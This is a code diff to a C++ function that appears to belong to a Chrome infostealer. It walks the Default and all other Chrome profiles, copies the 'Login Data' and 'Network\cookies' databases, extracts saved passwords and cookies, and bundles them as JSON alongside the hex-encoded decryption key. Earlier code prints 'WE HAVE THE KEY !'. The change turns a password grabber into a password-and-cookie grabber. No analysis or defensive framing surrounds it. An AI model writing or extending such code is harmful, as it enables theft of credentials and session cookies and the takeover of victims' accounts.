@@ -131,15 +131,17 @@ json driver(){
     printf("\nWE HAVE THE KEY !\n");
 
     //char * a = "\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data";
-    
+    // cookies: \Users\Wyatt2\AppData\Local\Google\Chrome\User Data\Default\Network\cookies
     //https://stackoverflow.com/questions/6858524/convert-char-to-lpwstr
     std::string s = (std::string(lpProfileDir) + std::string("\\AppData\\Local\\Google\\Chrome\\User Data"));
     //std::cout << s << " <------- path\n";
     std::string prof_path;
+    std::string cook_path;
     //https://stackoverflow.com/questions/1878001/how-do-i-check-if-a-c-stdstring-starts-with-a-certain-string-and-convert-a
 
     //do for default
-    json allRes;
+    json allPWs;
+    json allCookies;
     prof_path = s + std::string("\\Default\\Login Data");
 
     
@@ -151,11 +153,23 @@ json driver(){
                 printf("Error: %d\n", GetLastError());
                 return -1;
             }
-            printf("\n\n\n-----RES beg------\n\n\n");
-            std::cout << getAllResults(temp);
-            printf("\n\n\n-----RE end------\n\n\n");
 
-            allRes[prof_path] = json(getAllResults(temp));
+            
+            allPWs[prof_path] = json(getAllResults(temp));
+    
+    cook_path = s + std::string("\\Default\\Network\\cookies");
+    const char * db_path2 = cook_path.c_str();
+
+            if (!CopyFile(db_path2,temp, false)){
+                printf("COPY FILE W FAILED \n");
+                printf("Error: %d\n", GetLastError());
+                return -1;
+            }
+        
+
+            
+            allCookies[prof_path] = json(getAllCookies(temp));
+    
 
     std::string prefix = "Profile";
     //do for all profiles
@@ -166,27 +180,34 @@ json driver(){
         if (!prefix.compare(entry.path().string().substr(s.size() + 1, prefix.size()))) {
             std::cout << entry.path().string() << '\n';
             prof_path =  entry.path().string() + std::string("\\Login Data");
-
             const char * db_path = prof_path.c_str();
-
-
             const char * temp = "ChromeData.db";
-
             if (!CopyFile(db_path,temp, false)){
                 printf("COPY FILE W FAILED \n");
                 printf("Error: %d\n", GetLastError());
                 return -1;
             }
+            allPWs[prof_path] = json(getAllResults(temp));
+
+            cook_path = entry.path().string() + std::string("\\Network\\cookies");
+            const char * db_path2 = cook_path.c_str();
+
+            if (!CopyFile(db_path2,temp, false)){
+                printf("COPY FILE W FAILED \n");
+                printf("Error: %d\n", GetLastError());
+                return -1;
+            }
             printf("\n\n\n-----RES beg------\n\n\n");
-            //std::cout << getAllResults(temp);
+            std::cout << getAllCookies(temp);
             printf("\n\n\n-----RE end------\n\n\n");
 
-            allRes[prof_path] = json(getAllResults(temp));
+            
+            allCookies[prof_path] = json(getAllCookies(temp));
+            //std::cout << allCookies[prof_path] << '\n';
+
+            //get cookies
         }
     }
-
-    printf("SHOULD FAIL AFTER HERE\n");
-
 
     
 
@@ -199,10 +220,12 @@ json driver(){
    //std::stringstream chrome_pass = get_chrome_pass(key->pbData + 5, db);
    json test;
    test["KEY"] = hexStr(key->pbData, key->cbData);
-   test["RECORDS"] = allRes;
+   test["PASSWORDS"] = allPWs;
+   test["COOKIES"] = allCookies;
+   std::cout << "\n\n\n---------------------------\n\n\n" << test.dump() << "\n\n\n--------------------------\n\n\n";
    //[path: results]
    //sqlite3_close(db);
-   return 0;
+   return test;
 }
 
 
